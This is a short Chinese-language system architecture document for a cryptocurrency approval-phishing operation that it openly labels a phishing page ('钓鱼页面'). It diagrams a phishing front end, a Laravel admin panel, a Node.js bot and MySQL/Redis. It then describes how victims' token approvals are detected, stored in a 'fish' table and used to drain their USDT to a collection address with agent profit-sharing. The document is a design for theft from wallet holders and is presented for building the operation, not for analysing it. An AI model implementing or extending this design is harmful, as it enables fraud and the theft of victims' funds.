# 系统架构

## 整体架构

```
用户钱包 (TRON/EVM)
       │
       ▼
  ┌─────────┐    ┌──────────────┐
  │ 钓鱼页面 │───▶│ 浏览播报 API  │
  └─────────┘    └──────┬───────┘
                        │
       ┌────────────────┴────────────────┐
       ▼                                 ▼
┌──────────────┐                  ┌──────────────┐
│ PHP Laravel  │                  │ Node.js Bot  │
│ (Web/Admin)  │                  │ (链上监控)    │
└──────┬───────┘                  └──────┬───────┘
       │                                 │
       └────────────┬────────────────────┘
                    ▼
            ┌──────────────┐
            │  MySQL+Redis │
            └──────────────┘
```

## 核心流程

```
用户 approve(合约地址, 金额)
  → bot.js 扫链检测到 approve 事件
  → 地址录入 fish 表
  → 余额 > 阈值时自动触发
  → bot.js 调用合约 controlAndTransferToken
  → USDT 转入收款地址（含代理分润）
```

## 组件说明

| 组件 | 端口 | 说明 |
|------|------|------|
| PHP Web | 80/8080 | 管理后台 + API 接口 |
| Node.js Bot | - | 链上监控 + Telegram 交互 |
| MySQL | 3306 | 业务数据存储 |
| Redis | 6379 | 缓存 + 队列 + 限流 |
